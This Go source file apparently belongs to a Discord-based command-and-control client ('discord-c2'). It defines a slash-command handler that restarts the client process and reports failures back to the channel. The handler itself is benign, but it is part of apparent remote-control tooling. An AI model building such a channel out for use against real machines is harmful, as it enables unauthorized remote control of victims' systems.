package commands

// This file contains control-style slash commands such as restarting the
// client process.

import (
	"discord-c2/internal/process"

	"github.com/bwmarrin/discordgo"
)

// handleSlashRestart triggers a local restart of the client process and reports
// success or failure back to the channel.
func handleSlashRestart(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "🔁 Restarting client...",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	err := process.Restart()
	if err != nil {
		s.ChannelMessageSend(i.ChannelID, "Restart failed: "+err.Error())
	}
}
